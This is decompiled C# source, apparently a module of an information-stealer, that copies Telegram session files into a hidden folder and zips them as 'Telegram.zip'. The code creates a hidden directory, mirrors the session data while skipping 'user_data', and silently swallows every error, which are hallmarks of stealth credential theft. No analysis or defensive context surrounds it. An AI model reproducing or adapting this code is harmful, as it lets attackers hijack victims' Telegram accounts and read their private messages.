using System;
using System.IO;
using System.Threading.Tasks;

namespace TelegramBot.Session
{
	// Token: 0x020000FD RID: 253
	public class CopySession
	{
		// Token: 0x0600035E RID: 862 RVA: 0x00026CA8 File Offset: 0x00024EA8
		public static async Task GetFilesSession(string Expansion, string From, string To, bool True = true)
		{
			try
			{
				if (Directory.Exists(From))
				{
					if (!Directory.Exists(To))
					{
						Directory.CreateDirectory(To).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
					}
					foreach (string text in Directory.GetFiles(From, Expansion))
					{
						try
						{
							File.Copy(text, Path.Combine(To, Path.GetFileName(text)));
						}
						catch
						{
						}
					}
					foreach (string text2 in Directory.GetDirectories(From, Expansion, SearchOption.AllDirectories))
					{
						try
						{
							if (!text2.Contains("user_data"))
							{
								Directory.CreateDirectory(text2.Replace(From, To));
							}
						}
						catch
						{
						}
					}
					foreach (string text3 in Directory.GetFiles(From, Expansion, SearchOption.AllDirectories))
					{
						try
						{
							File.Copy(text3, text3.Replace(From, To), True);
						}
						catch
						{
						}
					}
					Archive.Zip(Folders.hidenfolder + "\\Telegram.zip", Folders.hidenfolder + "\\Session").Wait();
				}
			}
			catch
			{
			}
		}
	}
}
